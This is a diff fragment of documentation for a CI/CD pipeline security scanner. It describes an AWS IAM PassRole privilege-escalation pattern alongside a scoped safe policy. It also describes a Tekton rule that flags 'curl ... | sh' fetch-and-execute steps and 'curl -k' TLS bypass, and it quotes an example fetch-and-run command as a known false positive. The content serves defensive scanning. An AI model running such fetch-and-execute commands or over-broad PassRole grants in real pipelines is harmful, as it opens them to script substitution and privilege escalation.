+# The Lambda now runs as ``prod-admin`` even though the
+# pipeline principal never had that role's permissions
+# directly. Classic role-hop privilege escalation.
+
+# Safe: pin to one role ARN AND require the pass be scoped
+# to the service that legitimately consumes it.
+{
+  "Effect": "Allow",
+  "Action": "iam:PassRole",
+  "Resource": "arn:aws:iam::123456789012:role/lambda-deploy-target",
+  "Condition": {
+    "StringEquals": {"iam:PassedToService": "lambda.amazonaws.com"}
+  }
+}
 
 **Source:** [`IAM-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -2973,6 +3231,10 @@ v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirem
 **Recommendation.** Replace ``curl ... | sh`` with a download-then-verify-then-execute pattern. Drop TLS-bypass flags (``curl -k``, ``git config http.sslverify false``); install the missing CA into the step image instead. Both forms let an attacker controlling DNS / a transparent proxy substitute the script the step runs.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Known false positives.**
+
+- Tasks running entirely against an internal mirror (``curl https://internal-mirror/install.sh | sh`` where the mirror is the same supply chain as the task image itself) carry less marginal risk than a public-internet fetch, but the rule still fires because the curl-pipe primitive is the structural signal. ``curl -k`` to a TLS endpoint with a known self-signed CA likewise triggers; the canonical fix is to install the CA into the step image and drop ``-k``, but per-task suppression via ``--ignore-file`` is the escape hatch.
 
 **Source:** [`TKN-008`](../providers/tekton.md#tkn-008) in the [Tekton provider](../providers/tekton.md).
 
